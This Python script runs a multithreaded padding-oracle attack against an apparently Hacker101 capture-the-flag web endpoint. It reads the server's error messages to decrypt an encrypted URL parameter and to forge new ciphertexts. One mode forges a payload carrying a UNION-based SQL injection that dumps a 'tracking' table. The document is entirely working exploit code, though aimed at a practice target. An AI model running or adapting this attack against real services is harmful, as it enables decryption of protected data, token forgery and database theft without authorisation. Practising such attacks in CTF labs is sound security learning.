import base64, sys, threading, time, requests

from padding_oracle import BLOCK_SIZE, full_attack, forge_block, decode_plaintext




BASE_URL = "https://*.ctf.hacker101.com/" # replace with your endpoint
BLOB = "*" # replace with the blob you get after submiting the form

NUM_THREADS = 15  # you can increase if stable, drop if you see 503s

# requests.Session isn't safe to share across threads under concurrent use,
# so each worker thread gets its own temporarily-created session.
_thread_local = threading.local()


def get_session():
    if not hasattr(_thread_local, "session"):
        _thread_local.session = requests.Session()
    return _thread_local.session


# for any code that still refers to a single shared session 
session = requests.Session()


# encodes str to base64, the converts to the url format
def b64_encode(data: bytes) -> str:
    s = base64.b64encode(data).decode()
    return s.replace('+', '-').replace('/', '!').replace('=', '~')

# converts str from the url format, the decodes it in base64
def b64_decode(s: str) -> bytes:
    s = s.replace('-', '+').replace('!', '/').replace('~', '=')
    s += '=' * (-len(s) % 4)
    return base64.b64decode(s)


def raw_query(raw_bytes: bytes) -> str:
    """
    Sends raw_bytes (IV + one ciphertext block) to the server.
    And return a str based on the content of response
    """
    post_param = b64_encode(raw_bytes)
    r = None
    for attempt in range(8):
        try:
            r = get_session().get(BASE_URL, params={"post": post_param}, timeout=20)
        except requests.exceptions.RequestException:
            time.sleep(1 * (attempt + 1))
            continue
        if r.status_code == 503:
            time.sleep(0.5 * (attempt + 1))
            continue
        break
    else:
        raise Exception("Server still unreachable/503 after retries")

    if "PaddingException" in r.text:
        return "bad_padding"
    if ("UnicodeDecodeError" in r.text or "json.loads" in r.text
            or "No JSON object" in r.text
            or "__getitem__" in r.text
            or "cur.execute" in r.text):
        return "good_padding"
    if "Incorrect padding" in r.text or "IV must be 16 bytes" in r.text:
        return "malformed"
    if "<form method=\"POST\">" in r.text and "post" not in r.url:
        return "fully_valid"
    if "<h1>" in r.text and "Traceback" not in r.text:
        return "fully_valid"
    return "unrecognized:" + r.text


def oracle(iv: bytes, block: bytes) -> bool:
    """
    Return true only if padding validated, else false 
    """
    result = raw_query(iv + block)
    return result in ("good_padding", "fully_valid")


def decrypt(blob_str: str, max_workers: int = NUM_THREADS) -> str:
    raw_bytes = b64_decode(blob_str)
    iv, ct = raw_bytes[:BLOCK_SIZE], raw_bytes[BLOCK_SIZE:]
    plaintext = full_attack(iv, ct, oracle, max_workers=max_workers)
    try:
        readable = decode_plaintext(plaintext)
    except ValueError as e:
        # if padding didn't strip cleanly, show the raw bytes so you can see
        # what actually came back instead of failing silently
        print(f"\n[!] couldn't strip PKCS7 padding ({e}); showing raw bytes")
        readable = plaintext.decode("utf-8", errors="replace")
    print("\nFinal decrypted plaintext:", readable)
    return readable


def forge_url(payload: bytes, max_workers: int = NUM_THREADS) -> str:
    forged = forge_block(payload, oracle, max_workers=max_workers)
    encoded_url = b64_encode(forged)
    print("\nForged payload:", payload)
    print(f"Forged URL: {BASE_URL}?post={encoded_url}")

    r = get_session().get(BASE_URL, params={"post": encoded_url})
    print("\nServer response:\n", r.text)
    return encoded_url


def sql_attack(max_workers: int = NUM_THREADS):
    payload = b'{"id":"0 UNION SELECT GROUP_CONCAT(id,0x3a,headers SEPARATOR 0x7c7c),1 FROM tracking--","key":"AAAAAAAAAAAAAAAAAAAAAA~~"}'
    url = forge_block(payload, oracle, max_workers=max_workers)
    print("\nForged payload:", payload)
    print(f"Forged URL: {BASE_URL}?post={url}")
    r = get_session().get(BASE_URL, params={"post": b64_encode(url)})
    print(r.text)
    return r


if __name__ == "__main__":
    MODE = sys.argv[1] if len(sys.argv) > 1 else "forge"

    if MODE == "decrypt":
        decrypt(BLOB)

    elif MODE == "forge":
        forge_url(b'{"id": 1}')

    elif MODE == "sql_attack":
        sql_attack()

    else:
        print(f"Unknown mode: {MODE!r} (expected decrypt | forge | sql_attack)")
